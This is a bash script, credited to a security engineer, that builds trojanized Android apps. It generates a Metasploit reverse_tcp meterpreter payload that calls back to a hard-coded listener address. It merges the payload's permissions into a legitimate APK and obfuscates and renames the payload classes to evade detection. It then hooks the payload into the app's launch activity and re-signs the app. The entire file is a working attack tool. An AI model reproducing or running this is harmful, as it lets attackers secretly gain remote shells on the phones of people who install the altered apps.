#!/bin/bash

# backdoor-apk.sh

# Dana James Traversie
# Security Engineer
# Check Point Software Technologies, Ltd.

# In addition to the obvious tools/utilities
# in use the following packages were also
# required on Kali Linux
# apt-get install lib32stdc++6 lib32ncurses5 lib32z1

# usage: ./backdoor-apk.sh original.apk

# modify the following values as necessary

MSFVENOM=msfvenom
LHOST="10.6.9.31"
LPORT="1337"
APKTOOL=third-party/apktool/apktool
DEX2JAR=d2j-dex2jar
PROGUARD=third-party/proguard5.2.1/lib/proguard
DX=third-party/android-sdk-linux/build-tools/23.0.3/dx
MY_PATH=`pwd`
ORIG_APK_FILE=$1
RAT_APK_FILE=Rat.apk
LOG_FILE=$MY_PATH/run.log

if [ -z $ORIG_APK_FILE ]; then
  echo "[!] No original APK file specified";
  exit 1;
fi

if [ ! -f $ORIG_APK_FILE ]; then
  echo "[!] Original APK file specified does not exist";
  exit 1;
fi

echo -n "[*] Generating reverse tcp meterpreter payload...";
$MSFVENOM -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
  echo "[!] Failed to generate RAT APK file";
  exit 1;
fi
echo "[+] Handle the meterpreter connection at: $LHOST:$LPORT"

echo -n "[*] Decompiling RAT APK file...";
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile RAT APK file";
  exit $rc;
fi

echo -n "[*] Decompiling original APK file...";
$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile original APK file";
  exit $rc;
fi

echo -n "[*] Merging permissions of original and payload projects...";
placeholder=`openssl rand -hex 16`
tmp_perms_file=$MY_PATH/perms.tmp
original_manifest_file=$MY_PATH/original/AndroidManifest.xml
payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
grep "<uses-permission" $original_manifest_file > $tmp_perms_file
grep "<uses-permission" $payload_manifest_file >> $tmp_perms_file
grep "<uses-permission" $tmp_perms_file|sort|uniq > $tmp_perms_file.uniq
mv $tmp_perms_file.uniq $tmp_perms_file
sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file > $merged_manifest_file
cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
mv $merged_manifest_file.uniq $merged_manifest_file
sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
mv $merged_manifest_file $original_manifest_file
echo "done."

rm -rf $MY_PATH/payload >> $LOG_FILE 2>&1

echo -n "[*] Running proguard on RAT APK file...";
mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
mkdir -v -p $MY_PATH/libs >> $LOG_FILE 2>&1
mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
$DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -v -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
cd $MY_PATH
rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
$PROGUARD @android.pro >>$LOG_FILE 2>&1
$DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
echo "done."

echo -n "[*] Decompiling obfuscated RAT APK file...";
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile RAT APK file";
  exit $rc;
fi

# avoid having com/metasploit/stage path to smali files
tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
tldlist_rand_line=`shuf -i 1-${tldlist_max_line} -n 1`
namelist_max_line=`wc -l $MY_PATH/lists/namelist.txt |awk '{ print $1 }'`
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_tld=`sed "${tldlist_rand_line}q;d" $MY_PATH/lists/tldlist.txt`
echo "payload_tld is: $payload_tld" >> $LOG_FILE 2>&1
payload_primary_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_primary_dir is: $payload_primary_dir" >> $LOG_FILE 2>&1
namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
echo "payload_sub_dir is: $payload_sub_dir" >> $LOG_FILE 2>&1

echo -n "[*] Creating new directories in original project for RAT smali files...";
mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to create new directories for RAT smali files";
  exit $rc;
fi

echo -n "[*] Copying RAT smali files to new directories in original project...";
cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to copy RAT smali files";
  exit $rc;
fi

echo -n "[*] Fixing RAT smali files...";
sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali} >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to fix RAT smali files";
  exit $rc;
fi

echo -n "[*] Locating smali file to hook in original project...";
total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
activity_line_count=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |grep -c "<activity"`
echo "Activity lines found above launcher line: $activity_line_count" >>$LOG_FILE 2>&1
tmp=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
if [ ! -f $smali_file_to_hook ]; then
  smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
fi
echo "The smali file to hook: $smali_file_to_hook" >> $LOG_FILE 2>&1
echo "done.";
if [ ! -f $smali_file_to_hook ]; then
  echo "[!] Failed to locate smali file to hook";
  exit 1;
fi

echo -n "[*] Adding hook in original smali file...";
sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to add hook";
  exit $rc;
fi

echo -n "[*] Recompiling original project with backdoor...";
$APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to recompile original project with backdoor";
  exit $rc;
fi

keystore=$MY_PATH/debug.keystore
compiled_apks=$MY_PATH/original/dist/*.apk

echo -n "[*] Signing recompiled APK..."
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apks debug.key >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to sign recompiled APK";
  exit $rc;
fi

exit 0
